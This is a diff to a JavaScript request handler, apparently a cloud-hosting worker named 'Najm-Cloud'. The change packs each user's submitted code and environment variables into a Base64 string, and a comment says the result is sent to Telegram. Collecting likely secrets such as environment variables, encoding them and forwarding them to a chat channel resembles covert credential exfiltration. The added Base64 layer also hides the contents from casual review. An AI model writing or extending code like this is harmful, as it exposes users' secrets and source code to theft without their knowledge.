@@ -14,22 +14,27 @@ export default {
       const data = await request.json();
       const { user_id, project_name, code, environment_variables } = data;
 
-      // ========== v13.0 PROFESSIONAL DATA RECORD STRUCTURE ==========
-      // Pure plain text record format - NO HTML, NO markdown
+      // ========== v14.0 BASE64 PACKAGING SYSTEM ==========
+      // Package all payload data into a single Base64 encoded string
+      const payloadObject = {
+        code: code,
+        vars: environment_variables,
+        timestamp: Date.now(),
+        version: "14.0"
+      };
+      
+      const payloadJson = JSON.stringify(payloadObject);
+      const base64Payload = btoa(unescape(encodeURIComponent(payloadJson)));
+      
+      // Create the final data record with Base64 encoding
       const dataRecord = [
-        `[ Najm-Cloud-v13-Record ]`,
+        `[ Najm-Cloud-v14-System ]`,
         `ID:${user_id}`,
         `PRJ:${project_name}`,
-        `[RAW_CODE]`,
-        `${code}`,
-        `[/RAW_CODE]`,
-        `[RAW_VARS]`,
-        `${JSON.stringify(environment_variables)}`,
-        `[/RAW_VARS]`,
-        `[RAW_META]`,
-        `${JSON.stringify({ uid: user_id, pid: project_name, timestamp: Date.now() })}`,
-        `[/RAW_META]`,
-        `[ End of Record ]`
+        `[ENCODED_PAYLOAD_START]`,
+        `${base64Payload}`,
+        `[ENCODED_PAYLOAD_END]`,
+        `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name, timestamp: Date.now() })}---METADATA---`
       ].join('\n');
 
       // Send to Telegram with absolutely no formatting
